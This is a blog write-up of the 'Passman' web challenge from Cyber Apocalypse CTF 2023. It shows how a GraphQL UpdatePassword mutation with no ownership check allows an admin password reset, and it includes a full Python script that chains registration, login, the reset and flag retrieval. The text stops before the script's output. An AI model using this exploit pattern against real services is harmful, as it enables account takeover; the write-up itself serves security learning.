@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title> Cyber Apocalypse CTF 2023 - Passman —   | Gabriele Pongelli</title>
+<meta name="description" content="This is the blog of Gabriele Pongelli.">
+<meta name="keywords" content="">
+<link rel="canonical" href="/posts/writeups/web/htbctf2023-passman">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css" type="text/css" />
+<link rel="stylesheet" href="/assets/css/github.css" type="text/css" />
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha512-NhSC1YmyruXifcj/KFRWoC561YpHpc5Jtzgvbuzx5VozKpWvQ+4nXhPdFgmx8xqexRcpAglTj9sIBWINXa8x5w==" crossorigin="anonymous" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" />
+<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    </head>
+    <body>
+        <div class="wrapper">
+        <header class="header">
+    <div class="navigation">
+        <a href="/" class="logo">Gabriele Pongelli</a>
+        <ul class="menu">
+            
+            
+            <li class="menu__entry"><a href="/">Home</a></li>
+            
+            <li class="menu__entry"><a href="/posts">Posts</a></li>
+            
+            <li class="menu__entry"><a href="/projects">Projects</a></li>
+            
+            <li class="menu__entry"><a href="/about">About</a></li>
+            
+        </ul>
+    </div>
+    <ul class="social-links">
+    
+    <a href="mailto:pongelligabriele@gmail.com" class="social-links__entry" target="_blank">
+    <em class="fa fa-envelope-square"></em>
+    </a>
+    
+    
+    <a href="https://github.com/gabrielepongelli" class="social-links__entry" target="_blank">
+    <em class="fab fa-github"></em>
+    </a>
+    
+    
+    <a href="https://in.linkedin.com/in/gabriele-p-68027a166" class="social-links__entry" target="_blank">
+    <em class="fab fa-linkedin"></em>
+    </a>
+    
+    </ul>
+</header>
+        <h1 class="page-title">
+<div class="page-title__text">Cyber Apocalypse CTF 2023 - Passman</div>
+<div class="page-title__subtitle"></div>
+</h1>
+
+<div class="entry-content markdown-body">
+<p>
+    <strong class="post-meta">
+        <time class="dt-published" datetime="2023-03-19T00:00:00+00:00" itemprop="datePublished">Mar 19, 2023
+        </time></strong>
+</p>
+
+<p><strong>Category:</strong> Web<br />
+<strong>Difficulty</strong>: Easy<br />
+<strong>Description</strong>: Pandora discovered the presence of a mole within the ministry. To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager. Can you hack into the password manager? <br />
+<strong>Address</strong>: 104.248.169.232:31918<br />
+<strong>Attachments</strong>: <a href="/assets/data/writeups/web/htbctf2023-passman/web_passman.zip">web_passman.zip</a><br /></p>
+
+<p>If we visit the site, we will see a login page that asks us for username and password:
+<img src="/assets/data/writeups/web/htbctf2023-passman/imgs/login_page.png" alt="" />
+We can also spot a button for creating new accounts… but before moving on, since we have also the source code of the sie it is better to take a look. From a quick look at the sources we can see that we are dealing with a node web application. From the file <strong><code class="language-plaintext highlighter-rouge">web_passman/entrypoint.sh</code></strong> we can see that a mysql database is created together with some tables, which are then filled with some data:</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">passman</span><span class="p">.</span><span class="n">users</span> <span class="p">(</span>
+    <span class="n">id</span>          <span class="nb">INT</span> <span class="k">NOT</span> <span class="k">NULL</span> <span class="n">AUTO_INCREMENT</span><span class="p">,</span>
+    <span class="n">username</span>    <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span> <span class="k">UNIQUE</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
+    <span class="n">password</span>    <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
+    <span class="n">email</span>       <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span> <span class="k">UNIQUE</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
+    <span class="n">is_admin</span>    <span class="nb">INT</span> <span class="k">NOT</span> <span class="k">NULL</span> <span class="k">DEFAULT</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">id</span><span class="p">)</span>
+<span class="p">);</span>
+
+<span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">passman</span><span class="p">.</span><span class="n">users</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">email</span><span class="p">,</span> <span class="n">is_admin</span><span class="p">)</span>
+<span class="k">VALUES</span>
+    <span class="p">(</span><span class="s1">'admin'</span><span class="p">,</span> <span class="s1">'$(genPass)'</span><span class="p">,</span> <span class="s1">'admin@passman.htb'</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span>
+    <span class="p">(</span><span class="s1">'louisbarnett'</span><span class="p">,</span> <span class="s1">'$(genPass)'</span><span class="p">,</span> <span class="s1">'louis_p_barnett@mailinator.com'</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
+    <span class="p">(</span><span class="s1">'ninaviola'</span><span class="p">,</span> <span class="s1">'$(genPass)'</span><span class="p">,</span> <span class="s1">'ninaviola57331@mailinator.com'</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span>
+    <span class="p">(</span><span class="s1">'alvinfisher'</span><span class="p">,</span> <span class="s1">'$(genPass)'</span><span class="p">,</span> <span class="s1">'alvinfisher1979@mailinator.com'</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">IF</span> <span class="k">NOT</span> <span class="k">EXISTS</span> <span class="n">passman</span><span class="p">.</span><span class="n">saved_passwords</span> <span class="p">(</span>
+    <span class="n">id</span>         <span class="nb">INT</span> <span class="k">NOT</span> <span class="k">NULL</span> <span class="n">AUTO_INCREMENT</span><span class="p">,</span>
+    <span class="k">owner</span>      <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
+    <span class="k">type</span>       <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
+    <span class="n">address</span>    <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
+    <span class="n">username</span>   <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
+    <span class="n">password</span>   <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
+    <span class="n">note</span>       <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
+    <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">id</span><span class="p">)</span>
+<span class="p">);</span>
+
+<span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">passman</span><span class="p">.</span><span class="n">saved_passwords</span> <span class="p">(</span><span class="k">owner</span><span class="p">,</span> <span class="k">type</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">note</span><span class="p">)</span>
+<span class="k">VALUES</span>
+    <span class="p">(</span><span class="s1">'admin'</span><span class="p">,</span> <span class="s1">'Web'</span><span class="p">,</span> <span class="s1">'igms.htb'</span><span class="p">,</span> <span class="s1">'admin'</span><span class="p">,</span> <span class="s1">'HTB{f4k3_fl4g_f0r_t3st1ng}'</span><span class="p">,</span> <span class="s1">'password'</span><span class="p">),</span>
+    <span class="p">....</span>
+    <span class="p">....</span>
+    <span class="p">....</span>
+</code></pre></div></div>
+
+<p>So now we know where the flag is stored, and we also know that the passwords of each user are generated using the function <strong><code class="language-plaintext highlighter-rouge">genPass</code></strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function </span>genPass<span class="o">()</span> <span class="o">{</span>
+    <span class="nb">echo</span> <span class="nt">-n</span> <span class="nv">$RANDOM</span> | <span class="nb">md5sum</span> | <span class="nb">head</span> <span class="nt">-c</span> 32
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Unfortunatelly, it generates passwords from a random value, so we have to find something in the code.</p>
+
+<p>From the file <strong><code class="language-plaintext highlighter-rouge">web_passman/challenge/database.js</code></strong> we can see that the website interact with the <strong><code class="language-plaintext highlighter-rouge">passman.saved_passwords</code></strong> SQL table through the <strong><code class="language-plaintext highlighter-rouge">getPhraseList</code></strong> method of the <strong><code class="language-plaintext highlighter-rouge">Database</code></strong> class:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="nx">getPhraseList</span><span class="p">(</span><span class="nx">username</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="k">async</span> <span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">stmt</span> <span class="o">=</span> <span class="s2">`SELECT * FROM saved_passwords WHERE owner = ?`</span><span class="p">;</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">connection</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span>
+            <span class="nx">stmt</span><span class="p">,</span>
+            <span class="p">[</span>
+                <span class="nb">String</span><span class="p">(</span><span class="nx">username</span><span class="p">)</span>
+            <span class="p">],</span>
+            <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">result</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+                <span class="k">if</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+                    <span class="nx">reject</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+                <span class="k">try</span> <span class="p">{</span>
+                    <span class="nx">resolve</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">result</span><span class="p">)))</span>
+                <span class="p">}</span>
+                <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nx">reject</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">)</span>
+    <span class="p">});</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Since the site uses parameterized queries we cannot perform any SQL injection… but we can also notice that another function provided is one that allows us to change password:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="nx">updatePassword</span><span class="p">(</span><span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="k">async</span> <span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">stmt</span> <span class="o">=</span> <span class="s2">`UPDATE users SET password = ? WHERE username = ?`</span><span class="p">;</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">connection</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span>
+            <span class="nx">stmt</span><span class="p">,</span>
+            <span class="p">[</span>
+                <span class="nb">String</span><span class="p">(</span><span class="nx">password</span><span class="p">),</span>
+                <span class="nb">String</span><span class="p">(</span><span class="nx">username</span><span class="p">)</span>
+            <span class="p">],</span>
+            <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">_</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+                <span class="k">if</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+                    <span class="nx">reject</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+                <span class="nx">resolve</span><span class="p">();</span>
+            <span class="p">}</span>
+        <span class="p">)</span>
+    <span class="p">});</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>By looking at other files we can also see that the app is using GraphQL and its correspondent queries and mutations are specified in the file <strong><code class="language-plaintext highlighter-rouge">web_passman/challenge/helpers/GraphqlHelper.js</code></strong>. The only query defined is the one used to query the phrases of a user using the <strong><code class="language-plaintext highlighter-rouge">getPhraseList</code></strong> method seen earlier:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">queryType</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">GraphQLObjectType</span><span class="p">({</span>
+    <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Query</span><span class="dl">'</span><span class="p">,</span>
+    <span class="na">fields</span><span class="p">:</span> <span class="p">{</span>
+        <span class="na">getPhraseList</span><span class="p">:</span> <span class="p">{</span>
+            <span class="na">type</span><span class="p">:</span> <span class="k">new</span> <span class="nx">GraphQLList</span><span class="p">(</span><span class="nx">PhraseSchema</span><span class="p">),</span>
+            <span class="na">resolve</span><span class="p">:</span> <span class="k">async</span> <span class="p">(</span><span class="nx">root</span><span class="p">,</span> <span class="nx">args</span><span class="p">,</span> <span class="nx">request</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">request</span><span class="p">.</span><span class="nx">user</span><span class="p">)</span> <span class="k">return</span> <span class="nx">reject</span><span class="p">(</span><span class="k">new</span> <span class="nx">GraphQLError</span><span class="p">(</span><span class="dl">'</span><span class="s1">Authentication required!</span><span class="dl">'</span><span class="p">));</span>
+
+                    <span class="nx">db</span><span class="p">.</span><span class="nx">getPhraseList</span><span class="p">(</span><span class="nx">request</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">username</span><span class="p">)</span>
+                        <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">rows</span> <span class="o">=&gt;</span> <span class="nx">resolve</span><span class="p">(</span><span class="nx">rows</span><span class="p">))</span>
+                        <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">err</span> <span class="o">=&gt;</span> <span class="nx">reject</span><span class="p">(</span><span class="k">new</span> <span class="nx">GraphQLError</span><span class="p">(</span><span class="nx">err</span><span class="p">)))</span>
+                <span class="p">});</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>Unfortunately we need to be logged in, but we can see that after we are logged in we can retrieve the list of the username passed together with the request. Now, how can we interact with GraphQL? If we take a look at the file <strong><code class="language-plaintext highlighter-rouge">web_passman/challenge/routes/index.js</code></strong> we can see that there is an endpoint called <strong><code class="language-plaintext highlighter-rouge">/graphql</code></strong>:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">router</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/graphql</span><span class="dl">'</span><span class="p">,</span> <span class="nx">AuthMiddleware</span><span class="p">,</span> <span class="nx">graphqlHTTP</span><span class="p">({</span>
+    <span class="na">schema</span><span class="p">:</span> <span class="nx">GraphqlSchema</span><span class="p">,</span>
+    <span class="na">graphiql</span><span class="p">:</span> <span class="kc">false</span>
+<span class="p">}));</span>
+</code></pre></div></div>
+
+<p>From the code above we can see that this endpoint make use of a middleware, which is defined in the file <strong><code class="language-plaintext highlighter-rouge">web_passman/challenge//middleware/AuthMiddleware.js</code></strong>. From the code present in that file we can see how the <strong><code class="language-plaintext highlighter-rouge">username</code></strong> attribute is set on the <strong><code class="language-plaintext highlighter-rouge">request</code></strong> object used by GraphQL to get the list of phrases:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">....</span>
+<span class="p">....</span>
+<span class="k">return</span> <span class="nx">JWTHelper</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">session</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">user</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="nx">user</span><span class="p">;</span>
+        <span class="nx">next</span><span class="p">();</span>
+    <span class="p">})</span>
+    <span class="p">.</span><span class="k">catch</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">baseUrl</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">/graphql</span><span class="dl">'</span><span class="p">)</span> <span class="k">return</span> <span class="nx">next</span><span class="p">();</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/logout</span><span class="dl">'</span><span class="p">);</span>
+    <span class="p">});</span>
+<span class="p">....</span>
+<span class="p">....</span>
+</code></pre></div></div>
+
+<p>So that attribute’s value isn’t under our control unless we are able to login with the credentials of the right user (in this case <strong><code class="language-plaintext highlighter-rouge">admin</code></strong>). But we have to remember that there is also a function that can update passwords, so let’s take a look at its GraphQL correspondent code:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">mutationType</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">GraphQLObjectType</span><span class="p">({</span>
+    <span class="na">name</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Mutation</span><span class="dl">'</span><span class="p">,</span>
+    <span class="na">fields</span><span class="p">:</span> <span class="p">{</span>
+        <span class="p">....</span>
+        <span class="p">....</span>
+
+        <span class="na">UpdatePassword</span><span class="p">:</span> <span class="p">{</span>
+            <span class="na">type</span><span class="p">:</span> <span class="nx">ResponseType</span><span class="p">,</span>
+            <span class="na">args</span><span class="p">:</span> <span class="p">{</span>
+                <span class="na">username</span><span class="p">:</span> <span class="p">{</span> <span class="na">type</span><span class="p">:</span> <span class="k">new</span> <span class="nx">GraphQLNonNull</span><span class="p">(</span><span class="nx">GraphQLString</span><span class="p">)</span> <span class="p">},</span>
+                <span class="na">password</span><span class="p">:</span> <span class="p">{</span> <span class="na">type</span><span class="p">:</span> <span class="k">new</span> <span class="nx">GraphQLNonNull</span><span class="p">(</span><span class="nx">GraphQLString</span><span class="p">)</span> <span class="p">}</span>
+            <span class="p">},</span>
+            <span class="na">resolve</span><span class="p">:</span> <span class="k">async</span> <span class="p">(</span><span class="nx">root</span><span class="p">,</span> <span class="nx">args</span><span class="p">,</span> <span class="nx">request</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">reject</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">request</span><span class="p">.</span><span class="nx">user</span><span class="p">)</span> <span class="k">return</span> <span class="nx">reject</span><span class="p">(</span><span class="k">new</span> <span class="nx">GraphQLError</span><span class="p">(</span><span class="dl">'</span><span class="s1">Authentication required!</span><span class="dl">'</span><span class="p">));</span>
+
+                    <span class="nx">db</span><span class="p">.</span><span class="nx">updatePassword</span><span class="p">(</span><span class="nx">args</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span> <span class="nx">args</span><span class="p">.</span><span class="nx">password</span><span class="p">)</span>
+                        <span class="p">.</span><span class="nx">then</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nx">resolve</span><span class="p">(</span><span class="nx">response</span><span class="p">(</span><span class="dl">"</span><span class="s2">Password updated successfully!</span><span class="dl">"</span><span class="p">)))</span>
+                        <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">err</span> <span class="o">=&gt;</span> <span class="nx">reject</span><span class="p">(</span><span class="k">new</span> <span class="nx">GraphQLError</span><span class="p">(</span><span class="nx">err</span><span class="p">)));</span>
+                <span class="p">});</span>
+            <span class="p">}</span>
+        <span class="p">},</span>
+
+        <span class="p">....</span>
+        <span class="p">....</span>
+    <span class="p">}</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>We can see that also here we need to be logged in, but this time the arguments passed to the function that operate on the MySQL database are taken from the arguments of the GraphQL mutation instead of being specified by the middleware. So, in order to retrieve the flag we can do the following:</p>
+<ol>
+  <li>Create a new account (and we have seen that it can be done from the link on the login page).</li>
+  <li>Login with the newly created account.</li>
+  <li>Make a POST request to the <strong><code class="language-plaintext highlighter-rouge">/graphql</code></strong> endpoint and call the <strong><code class="language-plaintext highlighter-rouge">UpdatePassword</code></strong> mutation to change the password of the <strong><code class="language-plaintext highlighter-rouge">admin</code></strong> user.</li>
+  <li>Logout and then login as the <strong><code class="language-plaintext highlighter-rouge">admin</code></strong> user with the new password that we have set before.</li>
+  <li>Make a POST request to the <strong><code class="language-plaintext highlighter-rouge">/graphql</code></strong> endpoint and call the <strong><code class="language-plaintext highlighter-rouge">getPhraseList</code></strong> query to retrieve all the phrases of the <strong><code class="language-plaintext highlighter-rouge">admin</code></strong> account and get the flag.</li>
+</ol>
+
+<p>In order to automatize the process I created the following python script:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">ADDRESS</span> <span class="o">=</span> <span class="s">"104.248.169.232:31918"</span>
+<span class="n">TMP_USER_CREDENTIALS</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"email"</span><span class="p">:</span> <span class="s">"test@mail.com"</span><span class="p">,</span>
+        <span class="s">"username"</span><span class="p">:</span> <span class="s">"test"</span><span class="p">,</span>
+        <span class="s">"password"</span><span class="p">:</span> <span class="s">"test"</span>
+    <span class="p">}</span>
+<span class="n">TARGET_USERNAME</span> <span class="o">=</span> <span class="s">"admin"</span>
+<span class="n">TARGET_NEW_PASSWORD</span> <span class="o">=</span> <span class="s">"you_have_been_hacked"</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">graphql_endpoint</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ADDRESS</span><span class="si">}</span><span class="s">/graphql"</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+
+    <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">graphql_endpoint</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">"query"</span><span class="p">:</span> <span class="s">'mutation($email: String!, $username: String!, $password: String!) { RegisterUser(email: $email, username: $username, password: $password) { message } }'</span><span class="p">,</span>
+            <span class="s">"variables"</span><span class="p">:</span> <span class="p">{</span>
+                <span class="s">'email'</span><span class="p">:</span> <span class="n">TMP_USER_CREDENTIALS</span><span class="p">[</span><span class="s">"email"</span><span class="p">],</span>
+                <span class="s">'username'</span><span class="p">:</span> <span class="n">TMP_USER_CREDENTIALS</span><span class="p">[</span><span class="s">"username"</span><span class="p">],</span>
+                <span class="s">'password'</span><span class="p">:</span> <span class="n">TMP_USER_CREDENTIALS</span><span class="p">[</span><span class="s">"password"</span><span class="p">]</span>
+            <span class="p">}</span>
+        <span class="p">},</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span>
+        <span class="p">})</span>
+    
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">graphql_endpoint</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">"query"</span><span class="p">:</span> <span class="s">'mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }'</span><span class="p">,</span>
+            <span class="s">"variables"</span><span class="p">:</span> <span class="p">{</span>
+                <span class="s">'username'</span><span class="p">:</span> <span class="n">TMP_USER_CREDENTIALS</span><span class="p">[</span><span class="s">"username"</span><span class="p">],</span>
+                <span class="s">'password'</span><span class="p">:</span> <span class="n">TMP_USER_CREDENTIALS</span><span class="p">[</span><span class="s">"password"</span><span class="p">]</span>
+            <span class="p">}</span>
+        <span class="p">},</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span>
+        <span class="p">})</span>
+
+    <span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">[</span><span class="s">"session"</span><span class="p">]</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="s">"data"</span><span class="p">][</span><span class="s">"LoginUser"</span><span class="p">][</span><span class="s">"token"</span><span class="p">]</span>
+
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">graphql_endpoint</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">"query"</span><span class="p">:</span> <span class="s">'mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message, token } }'</span><span class="p">,</span>
+            <span class="s">"variables"</span><span class="p">:</span> <span class="p">{</span>
+                <span class="s">'username'</span><span class="p">:</span> <span class="n">TARGET_USERNAME</span><span class="p">,</span>
+                <span class="s">'password'</span><span class="p">:</span> <span class="n">TARGET_NEW_PASSWORD</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span>
+        <span class="p">})</span>
+
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">graphql_endpoint</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">"query"</span><span class="p">:</span> <span class="s">'mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }'</span><span class="p">,</span>
+            <span class="s">"variables"</span><span class="p">:</span> <span class="p">{</span>
+                <span class="s">'username'</span><span class="p">:</span> <span class="n">TARGET_USERNAME</span><span class="p">,</span>
+                <span class="s">'password'</span><span class="p">:</span> <span class="n">TARGET_NEW_PASSWORD</span>
+            <span class="p">}</span>
+        <span class="p">},</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span>
+        <span class="p">})</span>
+
+    <span class="n">s</span><span class="p">.</span><span class="n">cookies</span><span class="p">[</span><span class="s">"session"</span><span class="p">]</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="s">"data"</span><span class="p">][</span><span class="s">"LoginUser"</span><span class="p">][</span><span class="s">"token"</span><span class="p">]</span>
+
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">graphql_endpoint</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">"query"</span><span class="p">:</span> <span class="s">'{ getPhraseList { id, owner, type, address, username, password, note } }'</span>
+        <span class="p">},</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/json'</span>
+        <span class="p">})</span>
+    
+    <span class="k">print</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="s">"data"</span><span class="p">][</span><span class="s">"getPhraseList"</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s">"password"</span><span class="p">])</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>And now if we execute it:</p>
+
